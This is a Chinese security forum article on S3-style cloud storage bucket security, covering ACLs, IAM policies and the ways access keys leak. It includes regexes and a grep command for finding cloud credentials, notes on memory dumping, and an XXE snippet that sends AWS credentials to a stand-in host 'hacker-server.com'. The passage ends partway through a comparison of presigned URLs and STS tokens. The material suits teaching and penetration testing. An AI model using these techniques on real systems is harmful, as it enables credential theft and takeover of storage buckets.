---
title: 浅谈S3标准下存储桶应用中的安全问题
url: https://forum.butian.net/share/4340
source: 奇安信攻防社区
date: 2025-05-29
fetch_date: 2025-10-06T22:24:17.874452
---

# 浅谈S3标准下存储桶应用中的安全问题

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 浅谈S3标准下存储桶应用中的安全问题

* [渗透测试](https://forum.butian.net/topic/47)

什么是存储桶
想象存储桶就像你家里的一个大柜子，专门用来存放各种物品（文件）。在阿里云对象存储服务(OSS)中，存储桶(Bucket)就是存放文件(对象)的基本容器。每个存储桶有自己唯一的名称，就...

致谢
==
本文思路请教自MOMO,Clay还有火炬，并且结合自己的一部分研究和搜集的公开文章，内容均可以在阿里云腾讯云的文档和各路大佬的微信公众号上中找到出处
什么是存储桶
======
想象存储桶就像你家里的一个大柜子，专门用来存放各种物品（文件）。在阿里云对象存储服务(OSS)中，存储桶(Bucket)就是存放文件(对象)的基本容器。每个存储桶有自己唯一的名称，就像每个柜子都有不同的编号一样。
当你使用OSS时，第一步就是创建一个存储桶，然后才能往里面上传文件。一个存储桶可以存放海量的文件，从照片、视频到文档、备份数据都可以。传统存储需要自建服务器、购买硬盘、维护机房，成本高昂；而云存储桶按实际使用量计费，无需前期投入，特别适合中小企业。例如，电商网站可以把商品图片放在存储桶，结合CDN加速，比自建服务器更省钱。所以，有很多企业选择上云，比如很多摄像头的视频存储。
什么是 ACL?
--------
ACL(访问控制列表)就像是存储桶的"门锁规则"，决定谁能访问你的存储桶以及如何访问。它控制着存储桶和其中文件的读写权限。OSS提供了几种预设的ACL策略，最常用的是以下两种：
![](https://nc0.cdn.zkaq.cn/md/19233/20250426/caa758b8-27ab-4f17-8496-6507177b7aa4.png)
### 公有读私有写
所有人都可以访问，攻击面较少，因为一般这情况下不会动态分配临时密钥。
### 私有读私有写
只有拥有你 (AKSK)，或者是拥有你下发的预签名(Pre-Sign)或者临时凭据(STS)的人才能去访问。
RAM/IAM 策略
----------
一种通过Json控制的，比ACL更加精确的权限控制，一般在STS的分配中很常见。
RAM对应的是阿里云，IAM对应的是S3，但其实二者差不多，格式差不多长这样：
```json
{
"Version": "2012-10-17",
"Statement": [{
"Effect": "Allow",
"Action": "s3:GetObject",
"Resource": "arn:aws:s3:::example-bucket/\*"
}]
}
```
| 具体的特性对比可以看这个 | 特性 | RAM/IAM 策略 | ACL |
|---|---|---|---|
| \*\*控制对象\*\* | 用户/角色（身份） | 资源（如 Bucket、文件） |
| \*\*权限粒度\*\* | 精细（可控制具体 API 操作） | 粗粒度（读/写/完全控制） |
| \*\*适用场景\*\* | 复杂权限管理（如企业多角色协作） | 简单公开/私有资源控制 |
可以理解预签名对应的是对单个文件对象的ACL控制，STS则是对要签名的对象的IAM/RAM控制
如何测试存储桶?
========
凭据泄露
----
开发：你重生了，你是一名开发牛马，老板发现存储桶的成本很低，要求你上云，于是为了方便，你心生一计，为了方便调试，直接把AKSK写进了前端JS。还能再不用修改后端的前提下光速上云。而且省去后端签名服务开发，客户端直传OSS提升性能，甚至可以让老板要求的"三天上线"KPI轻松达成。
```php
// src/utils/ossClient.js
const client = new OSS({
region: 'oss-cn-hangzhou',
accessKeyId: 'LTAI5t1234567890ABCDEF', // 真实的AK
accessKeySecret: 'BaiduCannotFindThis1234567890ABCDEF', // 真实的SK
bucket: 'production-bucket'
})
```
上线后第7天凌晨2点，你接到了\*\*安全部门紧急电话：\*\*"你们前端JS里的AKSK被白帽黑客扫到了！"，你失去了这个月的奖金作为那个白帽子的赏金，你的直系领导让你长点心吧。
### 规则匹配
作为测试人员,我们不可能每个 java 文件每个源码的翻找。这里我总结了一些网上常见的 aksk 格式，并且整理成了正则表达式，可以直接使用:
```php
阿里云
^LTAI[0-9a-zA-Z]{20}$
腾讯云
^AKID[0-9a-zA-Z]{32}$
亚马逊云
(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}
火山引擎
(AKL|AKTP)[a-zA-Z0-9]{35,50}
金山云
^AKLT[\\w-]{20}$
京东云
^JDC\_[0-9A-Z]{28}$
一把梭:
(?i)((access\_key|access\_token|admin\_pass|admin\_user|algolia\_admin\_key|algolia\_api\_key|alias\_pass|alicloud\_access\_key|amazon\_secret\_access\_key|amazonaws|ansible\_vault\_password|aos\_key|api\_key|api\_key\_secret|api\_key\_sid|api\_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app\_debug|app\_id|app\_key|app\_log\_level|app\_secret|appkey|appkeysecret|application\_key|appsecret|appspot|auth\_token|authorizationToken|authsecret|aws\_access|aws\_access\_key\_id|aws\_bucket|aws\_key|aws\_secret|aws\_secret\_key|aws\_token|AWSSecretKey|b2\_app\_key|bashrc password|bintray\_apikey|bintray\_gpg\_password|bintray\_key|bintraykey|bluemix\_api\_key|bluemix\_pass|browserstack\_access\_key|bucket\_password|bucketeer\_aws\_access\_key\_id|bucketeer\_aws\_secret\_access\_key|built\_branch\_deploy\_key|bx\_password|cache\_driver|cache\_s3\_secret\_key|cattle\_access\_key|cattle\_secret\_key|certificate\_password|ci\_deploy\_password|client\_secret|client\_zpk\_secret\_key|clojars\_password|cloud\_api\_key|cloud\_watch\_aws\_access\_key|cloudant\_password|cloudflare\_api\_key|cloudflare\_auth\_key|cloudinary\_api\_secret|cloudinary\_name|codecov\_token|config|conn.login|connectionstring|consumer\_key|consumer\_secret|credentials|cypress\_record\_key|database\_password|database\_schema\_test|datadog\_api\_key|datadog\_app\_key|db\_password|db\_server|db\_username|dbpasswd|dbpassword|dbuser|deploy\_password|digitalocean\_ssh\_key\_body|digitalocean\_ssh\_key\_ids|docker\_hub\_password|docker\_key|docker\_pass|docker\_passwd|docker\_password|dockerhub\_password|dockerhubpassword|dot-files|dotfiles|droplet\_travis\_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica\_host|elastica\_port|elasticsearch\_password|encryption\_key|encryption\_password|env.heroku\_api\_key|env.sonatype\_password|eureka.awssecretkey)[a-z0-9\_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-\_=]{8,64})['\"]
```
而我们这里可以直接使用 bash 匹配:
```php
strings target.apk | grep -E "正则表达式"
```
### 逆向解密
故事继续:被安全部门通报后，你连夜赶工，决定在前端JS里对AKSK进行\*\*“高级加密”\*\*：被扣奖金后，你连夜用AES加密改写了代码，并且自己写了一套代码混淆和加解密的规则。
你以为高枕无忧时，安全部门再次来电："应急响应中心来了消息，说你的代码被逆向了"
更多时候，业务不会直接硬编码密钥到本地的文件中，而是采取了加密的手段，比如各种 AES，混淆，以及各种，甚至是从服务端下发解密 AKSK 密文所需要的密钥，但是，只要 AKSK 放在本地，毕竟还是存在被解密的风险。但是具体的方式有 webpack 解包,IDA 逆向，这里能说的很多，没有必要拘泥于单个逆向的手法就不展开了。重点还是去观察程序本身的逻辑。比如说这里你发现:
![](https://nc0.cdn.zkaq.cn/md/19233/20250426/61632d62-2c7f-4ae8-a1ee-4b34c713946b.png)
这里再没有和后端任何交互的前提下就直接发送了 STS 凭据，这就有理由怀疑这个 AKSK 存储再本地，STS 是再本地完成生成的。这个时候我们作为白帽子就可以考虑逆向了
### 内存提取
故事继续:身为开发的你决定和这个白帽子杠上了，被扣奖金后，你痛定思痛，决定彻底解决AKSK泄露问题。你研究了一堆安全方案，最终设计出一套“完美”防御：
动态AKSK下发：每次启动时，客户端向后端请求加密的AKSK，仅保存在内存中，用完即焚
RSA+AES混合加密：客户端生成随机AES密钥，用后端RSA公钥加密后传输。
后端解密后，用AES加密AKSK返回，客户端内存解密后使用，不写入任何存储。
而且我使用C++编写核心逻辑，编译成WebAssembly（WASM），让JS调试工具失效。
关键变量实时覆写，AKSK用完后立即memset清零内存。
检测调试器附着（如IsDebuggerPresent），发现则崩溃进程。
专用客户端：用Electron封装，禁用DevTools，让浏览器调试彻底失效。
你自信满满：“哼，我的AKSK存活时间极短，还有WASM保护，看你怎么抓！”
但是再二进制世界的另外一端，一个白帽子悄悄打开了任务管理器:选中你的进程后单击了转换成存储文件的按钮，并且通过代理抓包让你的客户端误认为是网络延迟卡在了使用 AKSK 上传图片前的那一步，并且对提取的存储文件做批量的内存关键字段分析，成功再次提取出了 AKSK。
不久之后，安全部门再次来电：\*\*“AKSK又泄露了！白帽子拿到了过去24小时的所有临时密钥！”\*\*
安全工程师王工叹了口气：
“你折腾这么多，还不如直接用\*\*OSS STS临时令牌\*\*，有效期最短15分钟，泄露了也自动失效。”
你终于认命，删掉了所有“反泄露”代码，换成了：
```php
axios.get('/sts-token').then(res => {
const client = new OSS({
accessKeyId: res.data.Credentials.AccessKeyId, // 临时AK
accessKeySecret: res.data.Credentials.AccessKeySecret, // 临时SK
stsToken: res.data.Credentials.SecurityToken, // 临时Token
bucket: 'your-bucket',
region: 'oss-cn-hangzhou'
});
});
```
作为白帽子我们回头看看，发现只要 aksk 有一段时间放在了本地一定是不安全的，都有会被破解。所以一定要对 AKSK 相关的关键字极为敏感。
### 后台泄露
我们接着有请”倒霉“被安全人员折磨的开发菌，故事继续：你正埋头改Bug，突然产品经理扔来一个需求：“用户上传的XML文件要能预览内容，明天上线！”你没多想，随手写了段渲染逻辑：
```php
// 解析用户上传的XML（毫无防备）
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
Document doc = factory.newDocumentBuilder().parse(userUploadedXMLFile);
```
\*\*“反正只是读个XML，能出啥问题？”\*\* 你嘀咕着，顺手把代码推上了线。
安全部门的王工发来一张截图：
```php
<!ENTITY % exfiltrate "http://hacker-server.com/?leak=%aws\_creds;">
%exfiltrate;
]>
<demo>XXE Test</demo>
```
\*\*你的大脑瞬间空白\*\*——用户上传的XML 的渲染结果里，赫然躺着你们服务器的环境变量，包括：
● OSS\\_ACCESS\\_KEY\\_ID=LTAI5tAbCdEfGhIjKlMnOpQr
● OSS\\_ACCESS\\_KEY\\_SECRET=BaiduCannotFindThis1234567890
一般的 AKSK 都是存放在环境变量中，这样有效避免了直接将 AKSK 硬编码到对应的代码或者是配置文件中，但是也会成为黑客重点关照的对象。这样还是会造成存储桶，接管。不只是通过直接的 XXE 读取，比如在 Django 框架的开发者模式下，攻击者会通过恶意的并发的操作来实现触发报错界面显示此时程序中的所有的变量和部分代码，这就包含 AKSK 和数据库密码等关键的变量了
![](https://nc0.cdn.zkaq.cn/md/19233/20250426/de9b0951-fdbf-4dc5-9333-bcd69800b7ec.png)
不仅如此，java 下 springboot 框架中的/heapdump 默认界面也会造成对应的内存状态未授权访问，从而造成 AKSK 泄露
云上越权
----
### 临时鉴权:预签名 vs. 临时凭据 vs. cdn 反向代理
### \*\*预签名（Presigned URL） vs STS（临时安全令牌）对比表\*\*
| | | |
|---|---|---|
| \*\*对比项\*\* | \*\*预签名（Presigned URL）\*\* | \*\*STS（临时安全令牌）\*\* |
| \*\*权限范围\*\* | 仅针对单个文件的操作（如上传/下载） | 可自定义细粒度权限（如限定Bucket、目录、操作类型） |
| \*\*有效期\*\* | 通常几分钟~7天（需提前设定） | 最短15分钟，最长36小时（推荐1小时内） |
| \*\*适用场景\*\* | 临时公开文件链接、客户端直传 | 需要复杂权限控制的客户端操作（如App、Web端） |
| \*\*安全性\*\* | 中（URL泄露后可能被滥用） | 高（令牌自动过期，权限可精确控制） |
| \*\*是否需要后端\*\* | 需后端生成签名URL | 需后端签发STS令牌 |
| \*\*典型操作\*\* | \*\*GetObject\*\*、\*\*PutObject\*\* | 任意OSS API操作（如\*\*ListObjects\*\*、\*\*DeleteObject\*\*） |
- - - - - -
### \*\*代码示例\*\*
####...